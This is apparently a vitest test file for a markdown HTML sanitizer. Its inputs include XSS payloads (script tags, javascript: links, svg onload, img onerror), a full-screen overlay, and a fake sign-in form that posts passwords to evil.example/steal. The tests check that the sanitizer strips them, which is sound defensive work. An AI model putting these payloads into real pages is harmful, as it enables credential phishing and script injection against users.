import { describe, expect, it } from 'vitest';
import { marked } from 'marked';
import { sanitizeMarkdownHtml } from './markdown-sanitize';

const render = (markdown: string) => sanitizeMarkdownHtml(marked.parse(markdown, { async: false }) as string);

describe('sanitizeMarkdownHtml', () => {
  it('keeps ordinary markdown', () => {
    const html = render('# Title\n\n- one\n- **two**\n\n`code` and [link](https://example.com)');
    expect(html).toContain('<h1>Title</h1>');
    expect(html).toContain('<strong>two</strong>');
    expect(html).toContain('<code>code</code>');
    expect(html).toContain('href="https://example.com"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('target="_blank"');
  });

  it('drops page-wide styles, style attributes and classes', () => {
    const html = render(
      '<p>x</p><style>body{display:none}</style><div style="position:fixed;inset:0;z-index:99999" class="chat-shell">cover</div>'
    );
    expect(html).not.toMatch(/<style/i);
    expect(html).not.toMatch(/style=/i);
    expect(html).not.toMatch(/class=/i);
    expect(html).toContain('cover');
  });

  it('drops forms, inputs, buttons and popovers', () => {
    const html = render(
      '<p>Session expired</p><form action="https://evil.example/steal" method="post"><input type="password" name="password"><button>Sign in</button></form><div popover id="p">x</div><a popovertarget="p">open</a>'
    );
    expect(html).not.toMatch(/<form|<input|<button/i);
    expect(html).not.toMatch(/popover/i);
    expect(html).not.toMatch(/\bid=/i);
  });

  it('refuses script, javascript: links, relative links and svg', () => {
    const html = render(
      '[a](javascript:alert(1)) and [b](/auth/logout)\n\n<script>alert(1)</script><svg onload="alert(1)"></svg><img src=x onerror="alert(1)">'
    );
    expect(html).toContain('<a>a</a>');
    expect(html).toContain('<a>b</a>');
    expect(html).not.toMatch(/<script|javascript:|onerror|onload|<svg/i);
    expect(html).not.toContain('/auth/logout');
  });

  it('replaces remote images with their alt text but keeps inline raster data', () => {
    const tiny = 'data:image/png;base64,iVBORw0KGgo=';
    const html = render(`![tracker](https://evil.example/pixel.png) ![ok](${tiny}) ![svg](data:image/svg+xml;base64,PHN2Zz4=)`);
    expect(html).not.toContain('evil.example');
    expect(html).toContain('[image: tracker]');
    expect(html).toContain(`src="${tiny}"`);
    expect(html).not.toContain('image/svg+xml');
  });
});
